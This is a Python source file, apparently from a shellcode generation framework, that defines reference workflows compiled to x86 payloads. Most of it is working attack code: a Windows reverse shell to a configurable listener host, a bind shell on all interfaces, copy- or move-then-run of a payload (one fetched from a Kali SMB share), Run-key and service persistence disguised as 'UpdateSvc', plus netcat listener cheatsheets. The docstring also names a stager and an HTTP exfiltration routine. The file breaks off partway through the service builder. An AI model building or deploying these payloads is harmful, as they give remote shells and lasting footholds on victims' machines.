"""Reference workflows and the WorkflowTemplate adapter.

WorkflowTemplate bridges the Workflow IR into the existing build pipeline
by implementing the PayloadTemplate interface.  It extracts manifest
requirements (APIs, strings, structs, locals) from the IR and delegates
payload assembly generation to the x86 backend.

Reference workflows:
  - run_command: WinExec + ExitProcess with branch on result
  - reverse_shell: WSAStartup, WSASocketA, connect, CreateProcessA
    with typed inputs (lhost, lport), struct init, and error branching
  - bind_shell: WSAStartup, WSASocketA, bind, listen, accept,
    CreateProcessA with typed lport, struct init, and error branching
  - copy_file: CopyFileA with configurable source and dest paths
  - copy_then_run: CopyFileA followed by WinExec
  - move_then_run: MoveFileA followed by WinExec
  - check_path: GetFileAttributesA to test file existence
  - tcp_stager: recv size header, VirtualAlloc RWX, recv loop, CallSlot
  - tcp_download: recv loop then write-to-disk and WinExec
  - http_download: WinINet InternetReadFile loop, write-to-disk, WinExec
  - http_exfil: ReadFile loop into buffer, WinINet POST to attacker
"""
from __future__ import annotations

import socket as _socket
import struct as _struct
from collections.abc import Callable

from ..payload_templates.base import PayloadTemplate, TemplateConfig
from ..stack_alloc import StackLayout
from .ir import (
    AddressOf,
    AllocateLocal,
    AllocateStruct,
    ArithOp,
    Block,
    CallAPI,
    CallSlot,
    Compare,
    ConstructString,
    DefineConstant,
    ExitStrategy,
    Immediate,
    Jump,
    NameRef,
    SuccessPredicate,
    Terminate,
    TerminateStyle,
    ValueRef,
    Workflow,
    WriteSlot,
    WriteStructField,
    ZeroStruct,
)
from .validator import validate
from .x86_backend import lower_workflow

# GetCurrentProcess() returns the pseudo-handle (HANDLE)-1 = 0xFFFFFFFF.
# We use the well-known constant directly to avoid an extra API resolution.
_CURRENT_PROCESS_HANDLE = 0xFFFFFFFF


def _make_exit_blocks(
    strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> tuple[Block, Block]:
    """Build reusable success/fail terminal blocks for the given exit strategy.

    EXIT_PROCESS:      ExitProcess(0) / ExitProcess(1)
    TERMINATE_PROCESS: TerminateProcess(GetCurrentProcess(), 0/1)
    THREAD_ONLY:       just hang (no process exit, useful for injected threads)
    """
    if strategy == ExitStrategy.EXIT_PROCESS:
        return (
            Block("success", (
                CallAPI("ExitProcess", arguments=(Immediate(0),)),
                Terminate(TerminateStyle.HANG),
            )),
            Block("fail", (
                CallAPI("ExitProcess", arguments=(Immediate(1),)),
                Terminate(TerminateStyle.HANG),
            )),
        )

    if strategy == ExitStrategy.TERMINATE_PROCESS:
        return (
            Block("success", (
                CallAPI(
                    "TerminateProcess",
                    arguments=(
                        Immediate(_CURRENT_PROCESS_HANDLE),
                        Immediate(0),
                    ),
                ),
                Terminate(TerminateStyle.HANG),
            )),
            Block("fail", (
                CallAPI(
                    "TerminateProcess",
                    arguments=(
                        Immediate(_CURRENT_PROCESS_HANDLE),
                        Immediate(1),
                    ),
                ),
                Terminate(TerminateStyle.HANG),
            )),
        )

    # THREAD_ONLY: no process termination
    return (
        Block("success", (
            Terminate(TerminateStyle.HANG),
        )),
        Block("fail", (
            Terminate(TerminateStyle.HANG),
        )),
    )


def _exit_api_name(strategy: ExitStrategy) -> str | None:
    """Return the API name the exit strategy requires, or None."""
    if strategy == ExitStrategy.EXIT_PROCESS:
        return "ExitProcess"
    if strategy == ExitStrategy.TERMINATE_PROCESS:
        return "TerminateProcess"
    return None


def _parse_exit_strategy(value: str) -> ExitStrategy:
    """Convert a config string to ExitStrategy enum."""
    try:
        return ExitStrategy(value)
    except ValueError:
        return ExitStrategy.EXIT_PROCESS


class WorkflowTemplate(PayloadTemplate):
    """Adapter that bridges a Workflow IR into the PayloadTemplate interface."""

    def __init__(self, workflow: Workflow) -> None:
        result = validate(workflow)
        if not result.valid:
            raise ValueError(
                "Workflow validation failed:\n"
                + "\n".join(f"  - {e}" for e in result.errors)
            )
        self._workflow = workflow

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        """Return the workflow to use for a given config.

        Subclasses that rebuild the workflow (e.g. for exit strategy)
        override this. The base implementation returns the static workflow.
        """
        return self._workflow

    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
        return lower_workflow(
            self._resolve_workflow(config), layout, config.badchars, config,
        )

    def _extract_slots(self, workflow: Workflow) -> list[str]:
        """Extract all slot names from a workflow's IR operations."""
        seen: set[str] = set()
        ordered: list[str] = []

        def _add(name: str) -> None:
            if name not in seen:
                seen.add(name)
                ordered.append(name)

        for block in workflow.blocks:
            for op in block.operations:
                if isinstance(op, CallAPI):
                    _add(op.api_name)
                    if op.result is not None:
                        _add(op.result)
                    for arg in op.arguments:
                        self._collect_value_refs(arg, _add)

                elif isinstance(op, ConstructString):
                    _add(op.name)

                elif isinstance(op, AllocateLocal):
                    _add(op.name)

                elif isinstance(op, AllocateStruct):
                    _add(op.struct_type)

                elif isinstance(op, WriteSlot):
                    _add(op.name)
                    self._collect_value_refs(op.value, _add)

                elif isinstance(op, ArithOp):
                    _add(op.result)
                    self._collect_value_refs(op.left, _add)
                    self._collect_value_refs(op.right, _add)

                elif isinstance(op, CallSlot):
                    _add(op.target)

                elif isinstance(op, Compare):
                    _add(op.value)

                elif isinstance(op, (DefineConstant,)):
                    pass

        return ordered

    def probe_slots(self, config: TemplateConfig) -> list[str]:
        """Extract all slot names the workflow needs from the IR directly."""
        return self._extract_slots(self._resolve_workflow(config))

    def probe_strings(self, config: TemplateConfig | None = None) -> dict[str, str]:
        """Return {label: value} for all ConstructString operations in the IR."""
        wf = self._resolve_workflow(config or TemplateConfig())
        result: dict[str, str] = {}
        for block in wf.blocks:
            for op in block.operations:
                if isinstance(op, ConstructString):
                    result[op.name] = op.value
        return result

    def probe_structs(self, config: TemplateConfig | None = None) -> dict[str, str]:
        """Return {name: struct_type} for all AllocateStruct operations."""
        wf = self._resolve_workflow(config or TemplateConfig())
        result: dict[str, str] = {}
        for block in wf.blocks:
            for op in block.operations:
                if isinstance(op, AllocateStruct):
                    result[op.name] = op.struct_type
        return result

    @staticmethod
    def _collect_value_refs(ref: ValueRef, add_fn: Callable[[str], None]) -> None:
        if isinstance(ref, NameRef):
            add_fn(ref.name)
        elif isinstance(ref, AddressOf):
            add_fn(ref.name)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return []


# ---------------------------------------------------------------------------
# Reference workflow builders
# ---------------------------------------------------------------------------


def build_run_command_workflow(
    command: str = "calc.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the run_command reference workflow.

    WinExec(command, SW_HIDE=0) -> branch on result -> exit
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_run_command",
        blocks=(
            Block("entry", (
                ConstructString("cmd", command),
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("cmd"), Immediate(0)),
                    result="wexec_result",
                ),
                Compare(
                    "wexec_result",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRRunCommandTemplate(WorkflowTemplate):
    """IR-backed run_command template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_run_command_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        command = config.command or "calc.exe"
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_run_command_workflow(command, exit_strategy=strategy)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Command executed on target", config.command or "calc.exe"),
        ]


# ---------------------------------------------------------------------------
# Reverse shell workflow
# ---------------------------------------------------------------------------

# STARTF_USESTDHANDLES tells CreateProcessA to use the hStdInput/Output/Error
# fields from STARTUPINFOA rather than inheriting the parent's console.
_STARTF_USESTDHANDLES = 0x00000100


def build_reverse_shell_workflow(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    command: str = "cmd.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the reverse_shell reference workflow.

    WSAStartup -> WSASocketA -> populate sockaddr_in -> connect ->
    populate STARTUPINFOA -> CreateProcessA -> ExitProcess

    The port and IP are pre-computed to network byte order and embedded
    as DefineConstant nodes, keeping the IR free of byte-order logic.
    """
    port_be = _socket.htons(lport)
    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]

    return Workflow(
        name="ir_reverse_shell",
        blocks=(
            Block("entry", (
                # Pre-compute network byte order values
                DefineConstant("sin_port_be", port_be),
                DefineConstant("sin_addr_le", ip_le),
                DefineConstant("af_inet", 2),

                # Allocate structures
                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),
                AllocateStruct("si", "STARTUPINFOA"),
                AllocateStruct("pi", "PROCESS_INFORMATION"),

                # Allocate string
                ConstructString("cmd", command),

                # Initialize Winsock
                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                # WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, NULL, 0, 0)
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2),    # AF_INET
                        Immediate(1),    # SOCK_STREAM
                        Immediate(6),    # IPPROTO_TCP
                        Immediate(0),    # lpProtocolInfo = NULL
                        Immediate(0),    # g = 0
                        Immediate(0),    # dwFlags = 0
                    ),
                    result="socket_handle",
                ),
                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="connect_socket", false_block="fail"),
            )),

            Block("connect_socket", (
                # Populate sockaddr_in
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),

                # connect(socket, &sockaddr_in, 0x10)
                CallAPI(
                    "connect",
                    arguments=(
                        NameRef("socket_handle"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="conn_ret",
                ),
                Compare("conn_ret", SuccessPredicate.ZERO,
                        true_block="setup_process", false_block="fail"),
            )),

            Block("setup_process", (
                # Zero and populate STARTUPINFOA
                ZeroStruct("si"),
                WriteStructField("si", "cb", Immediate(0x44)),
                WriteStructField("si", "dwFlags",
                                 Immediate(_STARTF_USESTDHANDLES)),
                WriteStructField("si", "hStdInput",
                                 NameRef("socket_handle")),
                WriteStructField("si", "hStdOutput",
                                 NameRef("socket_handle")),
                WriteStructField("si", "hStdError",
                                 NameRef("socket_handle")),

                # Zero PROCESS_INFORMATION
                ZeroStruct("pi"),

                # CreateProcessA(NULL, &cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
                CallAPI(
                    "CreateProcessA",
                    arguments=(
                        Immediate(0),       # lpApplicationName = NULL
                        AddressOf("cmd"),   # lpCommandLine
                        Immediate(0),       # lpProcessAttributes = NULL
                        Immediate(0),       # lpThreadAttributes = NULL
                        Immediate(1),       # bInheritHandles = TRUE
                        Immediate(0),       # dwCreationFlags = 0
                        Immediate(0),       # lpEnvironment = NULL
                        Immediate(0),       # lpCurrentDirectory = NULL
                        AddressOf("si"),    # lpStartupInfo
                        AddressOf("pi"),    # lpProcessInformation
                    ),
                    result="cpa_ret",
                ),
                Compare("cpa_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            *_make_exit_blocks(exit_strategy),
        ),
        entry="entry",
    )


class IRReverseShellTemplate(WorkflowTemplate):
    """IR-backed reverse_shell template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_reverse_shell_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_reverse_shell_workflow(
            lhost=config.lhost,
            lport=config.lport,
            command=config.command or "cmd.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Start netcat listener", f"nc -lnvp {config.lport}"),
            ("Start listener (rlwrap)", f"rlwrap nc -lnvp {config.lport}"),
        ]


# ---------------------------------------------------------------------------
# Bind shell workflow
# ---------------------------------------------------------------------------

_INADDR_ANY = 0  # 0.0.0.0


def build_bind_shell_workflow(
    lport: int = 4444,
    command: str = "cmd.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the bind_shell reference workflow.

    WSAStartup -> WSASocketA -> bind -> listen -> accept ->
    populate STARTUPINFOA (stdio = accepted socket) -> CreateProcessA ->
    ExitProcess

    The port is pre-computed to network byte order. The bind address is
    INADDR_ANY (0.0.0.0) so the shell listens on all interfaces.
    """
    port_be = _socket.htons(lport)

    return Workflow(
        name="ir_bind_shell",
        blocks=(
            Block("entry", (
                DefineConstant("sin_port_be", port_be),
                DefineConstant("af_inet", 2),
                DefineConstant("inaddr_any", _INADDR_ANY),

                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),
                AllocateStruct("si", "STARTUPINFOA"),
                AllocateStruct("pi", "PROCESS_INFORMATION"),

                ConstructString("cmd", command),

                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2),    # AF_INET
                        Immediate(1),    # SOCK_STREAM
                        Immediate(6),    # IPPROTO_TCP
                        Immediate(0),    # lpProtocolInfo = NULL
                        Immediate(0),    # g = 0
                        Immediate(0),    # dwFlags = 0
                    ),
                    result="listen_socket",
                ),
                Compare("listen_socket", SuccessPredicate.INVALID_HANDLE,
                        true_block="bind_socket", false_block="fail"),
            )),

            Block("bind_socket", (
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("inaddr_any")),

                CallAPI(
                    "bind",
                    arguments=(
                        NameRef("listen_socket"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="bind_ret",
                ),
                Compare("bind_ret", SuccessPredicate.ZERO,
                        true_block="listen_socket_block", false_block="fail"),
            )),

            Block("listen_socket_block", (
                CallAPI(
                    "listen",
                    arguments=(
                        NameRef("listen_socket"),
                        Immediate(1),   # backlog = 1
                    ),
                    result="listen_ret",
                ),
                Compare("listen_ret", SuccessPredicate.ZERO,
                        true_block="accept_conn", false_block="fail"),
            )),

            Block("accept_conn", (
                CallAPI(
                    "accept",
                    arguments=(
                        NameRef("listen_socket"),
                        Immediate(0),   # addr = NULL
                        Immediate(0),   # addrlen = NULL
                    ),
                    result="client_socket",
                ),
                Compare("client_socket", SuccessPredicate.INVALID_HANDLE,
                        true_block="setup_process", false_block="fail"),
            )),

            Block("setup_process", (
                ZeroStruct("si"),
                WriteStructField("si", "cb", Immediate(0x44)),
                WriteStructField("si", "dwFlags",
                                 Immediate(_STARTF_USESTDHANDLES)),
                WriteStructField("si", "hStdInput",
                                 NameRef("client_socket")),
                WriteStructField("si", "hStdOutput",
                                 NameRef("client_socket")),
                WriteStructField("si", "hStdError",
                                 NameRef("client_socket")),

                ZeroStruct("pi"),

                CallAPI(
                    "CreateProcessA",
                    arguments=(
                        Immediate(0),       # lpApplicationName = NULL
                        AddressOf("cmd"),   # lpCommandLine
                        Immediate(0),       # lpProcessAttributes = NULL
                        Immediate(0),       # lpThreadAttributes = NULL
                        Immediate(1),       # bInheritHandles = TRUE
                        Immediate(0),       # dwCreationFlags = 0
                        Immediate(0),       # lpEnvironment = NULL
                        Immediate(0),       # lpCurrentDirectory = NULL
                        AddressOf("si"),    # lpStartupInfo
                        AddressOf("pi"),    # lpProcessInformation
                    ),
                    result="cpa_ret",
                ),
                Compare("cpa_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            *_make_exit_blocks(exit_strategy),
        ),
        entry="entry",
    )


class IRBindShellTemplate(WorkflowTemplate):
    """IR-backed bind_shell template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_bind_shell_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_bind_shell_workflow(
            lport=config.lport,
            command=config.command or "cmd.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Connect to bind shell", f"nc -nv <TARGET_IP> {config.lport}"),
            ("Connect (rlwrap)", f"rlwrap nc -nv <TARGET_IP> {config.lport}"),
        ]


# ---------------------------------------------------------------------------
# Copy file workflow
# ---------------------------------------------------------------------------


def build_copy_file_workflow(
    src_path: str = r"C:\source.txt",
    dst_path: str = r"C:\dest.txt",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the copy_file reference workflow.

    CopyFileA(src, dst, FALSE) -> branch on result -> exit
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_copy_file",
        blocks=(
            Block("entry", (
                ConstructString("src_path", src_path),
                ConstructString("dst_path", dst_path),
                CallAPI(
                    "CopyFileA",
                    arguments=(
                        AddressOf("src_path"),
                        AddressOf("dst_path"),
                        Immediate(0),  # bFailIfExists = FALSE
                    ),
                    result="copy_ret",
                ),
                Compare(
                    "copy_ret",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRCopyFileTemplate(WorkflowTemplate):
    """IR-backed copy_file template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_copy_file_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_copy_file_workflow(
            src_path=config.src_path or r"C:\source.txt",
            dst_path=config.dst_path or r"C:\dest.txt",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path", config.src_path or r"C:\source.txt"),
            ("Destination path", config.dst_path or r"C:\dest.txt"),
        ]


# ---------------------------------------------------------------------------
# Copy then run workflow
# ---------------------------------------------------------------------------


def build_copy_then_run_workflow(
    src_path: str = r"C:\source\payload.exe",
    dst_path: str = r"C:\Windows\Temp\payload.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the copy_then_run reference workflow.

    CopyFileA(src, dst, FALSE) -> WinExec(dst, SW_HIDE) -> exit

    dst_path is both the copy destination and the command line.
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_copy_then_run",
        blocks=(
            Block("entry", (
                ConstructString("src_path", src_path),
                ConstructString("dst_path", dst_path),
                CallAPI(
                    "CopyFileA",
                    arguments=(
                        AddressOf("src_path"),
                        AddressOf("dst_path"),
                        Immediate(0),  # bFailIfExists = FALSE
                    ),
                    result="copy_ret",
                ),
                Compare(
                    "copy_ret",
                    SuccessPredicate.NONZERO,
                    true_block="run_payload",
                    false_block="fail",
                ),
            )),
            Block("run_payload", (
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("dst_path"), Immediate(0)),
                    result="exec_ret",
                ),
                Compare(
                    "exec_ret",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRCopyThenRunTemplate(WorkflowTemplate):
    """IR-backed copy_then_run template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_copy_then_run_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_copy_then_run_workflow(
            src_path=config.src_path or r"C:\source\payload.exe",
            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path", config.src_path or r"C:\source\payload.exe"),
            ("Destination path (also executed)",
             config.dst_path or r"C:\Windows\Temp\payload.exe"),
        ]


# ---------------------------------------------------------------------------
# Move then run workflow
# ---------------------------------------------------------------------------


def build_move_then_run_workflow(
    src_path: str = r"\\192.168.1.10\kalismb\payload.exe",
    dst_path: str = r"C:\Windows\Temp\payload.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the move_then_run reference workflow.

    MoveFileA(src, dst) -> WinExec(dst, SW_HIDE) -> exit

    dst_path is both the move destination and the command line.
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_move_then_run",
        blocks=(
            Block("entry", (
                ConstructString("src_path", src_path),
                ConstructString("dst_path", dst_path),
                CallAPI(
                    "MoveFileA",
                    arguments=(
                        AddressOf("src_path"),
                        AddressOf("dst_path"),
                    ),
                    result="move_ret",
                ),
                Compare(
                    "move_ret",
                    SuccessPredicate.NONZERO,
                    true_block="run_payload",
                    false_block="fail",
                ),
            )),
            Block("run_payload", (
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("dst_path"), Immediate(0)),
                    result="exec_ret",
                ),
                Compare(
                    "exec_ret",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRMoveThenRunTemplate(WorkflowTemplate):
    """IR-backed move_then_run template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_move_then_run_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_move_then_run_workflow(
            src_path=config.src_path or r"\\192.168.1.10\kalismb\payload.exe",
            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path (moved, not copied)",
             config.src_path or r"\\192.168.1.10\kalismb\payload.exe"),
            ("Destination path (also executed)",
             config.dst_path or r"C:\Windows\Temp\payload.exe"),
        ]


# ---------------------------------------------------------------------------
# Check path workflow
# ---------------------------------------------------------------------------


def build_check_path_workflow(
    check_path: str = r"C:\Windows\System32\cmd.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the check_path reference workflow.

    GetFileAttributesA(path) -> branch on INVALID_FILE_ATTRIBUTES -> exit

    Success (file exists) exits with code 0, failure with code 1.
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_check_path",
        blocks=(
            Block("entry", (
                ConstructString("check_path", check_path),
                CallAPI(
                    "GetFileAttributesA",
                    arguments=(AddressOf("check_path"),),
                    result="path_attrs",
                ),
                Compare(
                    "path_attrs",
                    SuccessPredicate.INVALID_HANDLE,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRCheckPathTemplate(WorkflowTemplate):
    """IR-backed check_path template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_check_path_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        path = config.dst_path or r"C:\Windows\System32\cmd.exe"
        return build_check_path_workflow(path, exit_strategy=strategy)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        path = config.dst_path or r"C:\Windows\System32\cmd.exe"
        return [
            ("Path checked", path),
            ("Exit code 0 if path exists", ""),
            ("Exit code 1 if path missing", ""),
        ]


# ---------------------------------------------------------------------------
# Registry persist workflow
# ---------------------------------------------------------------------------

_HKEY_CURRENT_USER = 0x80000001
_KEY_SET_VALUE = 0x0002
_REG_SZ = 1

_DEFAULT_REG_SUBKEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
_DEFAULT_REG_VALUE = "UpdateSvc"
_DEFAULT_DST_PATH = r"C:\Windows\Temp\svc.exe"


def build_registry_persist_workflow(
    reg_subkey: str = _DEFAULT_REG_SUBKEY,
    value_name: str = _DEFAULT_REG_VALUE,
    dst_path: str = _DEFAULT_DST_PATH,
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    r"""Build the registry_persist reference workflow.

    RegOpenKeyExA(HKCU, subkey, 0, KEY_SET_VALUE, &hKey) ->
    RegSetValueExA(hKey, value_name, 0, REG_SZ, dst_path, len) ->
    RegCloseKey(hKey) -> exit

    The phkResult OUT parameter uses AddressOf(AllocateLocal) so the API
    writes the opened key handle through a pointer. Subsequent calls read
    it back via NameRef.
    """
    dst_len = len(dst_path) + 1  # null terminator

    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_registry_persist",
        blocks=(
            Block("entry", (
                ConstructString("reg_subkey", reg_subkey),
                ConstructString("reg_value_name", value_name),
                ConstructString("dst_path", dst_path),
                AllocateLocal("reg_handle"),

                CallAPI(
                    "RegOpenKeyExA",
                    arguments=(
                        Immediate(_HKEY_CURRENT_USER),
                        AddressOf("reg_subkey"),
                        Immediate(0),          # ulOptions
                        Immediate(_KEY_SET_VALUE),
                        AddressOf("reg_handle"),  # phkResult (OUT)
                    ),
                    result="regopen_ret",
                ),
                Compare(
                    "regopen_ret",
                    SuccessPredicate.ZERO,
                    true_block="set_value",
                    false_block="fail",
                ),
            )),

            Block("set_value", (
                CallAPI(
                    "RegSetValueExA",
                    arguments=(
                        NameRef("reg_handle"),
                        AddressOf("reg_value_name"),
                        Immediate(0),          # Reserved
                        Immediate(_REG_SZ),
                        AddressOf("dst_path"),
                        Immediate(dst_len),
                    ),
                    result="regset_ret",
                ),
                # Close regardless of set result
                CallAPI(
                    "RegCloseKey",
                    arguments=(NameRef("reg_handle"),),
                ),
                Jump("success"),
            )),

            success,
            fail,
        ),
        entry="entry",
    )


class IRRegistryPersistTemplate(WorkflowTemplate):
    """IR-backed registry_persist template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_registry_persist_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_registry_persist_workflow(
            reg_subkey=_DEFAULT_REG_SUBKEY,
            value_name=config.service_name or _DEFAULT_REG_VALUE,
            dst_path=config.dst_path or _DEFAULT_DST_PATH,
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        val = config.service_name or _DEFAULT_REG_VALUE
        dst = config.dst_path or _DEFAULT_DST_PATH
        return [
            ("Registry hive", "HKEY_CURRENT_USER"),
            ("Run key", _DEFAULT_REG_SUBKEY),
            ("Value name", val),
            ("Binary path on target", dst),
            ("Check value",
             f'reg query "HKCU\\{_DEFAULT_REG_SUBKEY}" /v {val}'),
            ("Remove value",
             f'reg delete "HKCU\\{_DEFAULT_REG_SUBKEY}" /v {val} /f'),
        ]


# ---------------------------------------------------------------------------
# Service persist workflow
# ---------------------------------------------------------------------------

_SC_MANAGER_CREATE_SERVICE = 0x0002
_SERVICE_ALL_ACCESS = 0x000F01FF
_SERVICE_WIN32_OWN_PROCESS = 0x10
_SERVICE_AUTO_START = 0x02
_SERVICE_ERROR_IGNORE = 0x00

_DEFAULT_SERVICE_NAME = "UpdateSvc"


def build_service_persist_workflow(
    service_name: str = _DEFAULT_SERVICE_NAME,
    dst_path: str = _DEFAULT_DST_PATH,
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the service_persist reference workflow.

    OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE) ->
    CreateServiceA(hSCM, name, display, SERVICE_ALL_ACCESS,
                   SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
                   SERVICE_ERROR_IGNORE, path, NULL x5) ->
    StartServiceA(hSvc, 0, NULL) ->
    CloseServiceHandle(hSvc) -> CloseServiceHandle(hSCM) -> exit
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_service_persist",
        blocks=(
            Block("entry", (
                ConstructString("service_name", service_name),
                ConstructString("dst_path", dst_path),

                CallAPI(
                    "OpenSCManagerA",
                    arguments=(
                        Immediate(0),    # lpMachineName = NULL
                        Immediate(0),    # lpDatabaseName = NULL
                        Immediate(_SC_MANAGER_CREATE_SERVICE),
                    ),
                    result="scm_handle",
                ),
                Compare(
                    "scm_handle",
                    SuccessPredicate.NONZERO,
                    true_block="create_service",
                    false_block="fail",
                ),
            )),

            Block("create_service", (
                CallAPI(
                    "CreateServiceA",
                    arguments=(
                        NameRef("scm_handle"),
                        AddressOf("service_name"),     # lpServiceName
                        AddressOf("service_name"),     # lpDisplayName (same)
                        Immediate(_SERVICE_ALL_ACCESS),
                        Immediate(_SERVICE_WIN32_OWN_PROCESS),
                        Immediate(_SERVICE_AUTO_START),
                        Immediate(_SERVICE_ERROR_IGNORE),
                        AddressOf("dst_path"),         # lpBinaryPathName
                        Immediate(0),    # lpLoadOrderGroup = NULL
                        Immediate(0),    # lpdwTagId = NULL
                        Immediate(0),    # lpDependencies = NULL
                        Immediate(0),    # lpServiceStartName = NULL
                        Immediate(0),    # lpPassword = NULL
                    ),
                    result="svc_handle",
                ),
                Compare(
                    "svc_handle",
                    SuccessPredicate.NONZERO,
                    true_block="start_service",
                    false_block="close_scm_fail",
                ),
            )),

            Block("start_service", (
                CallAPI(
                    "StartServiceA",
                    arguments=(
                        NameRef("svc_handle"),
                        Immediate(0),    # dwNumServiceArgs = 0
                        Immediate(0),    # lpServiceArgVectors = NULL
                    ),
                ),
                # Close service handle
                CallAPI(
                    "CloseServiceHandle",
